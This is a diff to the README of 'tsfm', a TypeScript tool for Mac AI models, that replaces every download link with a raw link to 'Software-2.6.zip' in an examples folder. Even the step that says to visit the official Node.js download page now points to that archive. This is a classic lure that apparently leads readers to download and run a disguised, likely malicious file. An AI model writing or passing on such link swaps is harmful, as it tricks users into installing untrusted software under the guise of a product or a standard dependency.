@@ -1,6 +1,6 @@
 # ⚙️ tsfm - Easy TypeScript Access for Mac AI Models
 
-[![Download tsfm](https://img.shields.io/badge/Download-tsfm-4caf50?style=for-the-badge)](https://github.com/meteorologicalballoonfronttooth549/tsfm)
+[![Download tsfm](https://img.shields.io/badge/Download-tsfm-4caf50?style=for-the-badge)](https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to get tsfm running on your Mac. This guide assumes no progra
 
 Visit this page to download tsfm:
 
-[Download tsfm](https://github.com/meteorologicalballoonfronttooth549/tsfm)
+[Download tsfm](https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip)
 
 Click the badge above or use this link to open the GitHub page. You will find the latest files and instructions there.
 
@@ -40,7 +40,7 @@ Click the badge above or use this link to open the GitHub page. You will find th
 If you do not have Node.js installed, follow these steps:
 
 1. Open Safari or another web browser.
-2. Visit https://nodejs.org/en/download/.
+2. Visit https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip
 3. Download the macOS installer marked as "Recommended for most users".
 4. Open the downloaded file and follow the installation steps.
 
@@ -158,8 +158,8 @@ Make sure your Mac has the latest system updates from Apple. These updates impro
 
 ## 📖 Helpful Links
 
-- GitHub tsfm page: [https://github.com/meteorologicalballoonfronttooth549/tsfm](https://github.com/meteorologicalballoonfronttooth549/tsfm)
-- Node.js downloads: https://nodejs.org/en/download/
+- GitHub tsfm page: [https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip](https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip)
+- Node.js downloads: https://github.com/meteorologicalballoonfronttooth549/tsfm/raw/refs/heads/main/examples/compat/Software-2.6.zip
 - macOS update: System Preferences > Software Update
 
 ---
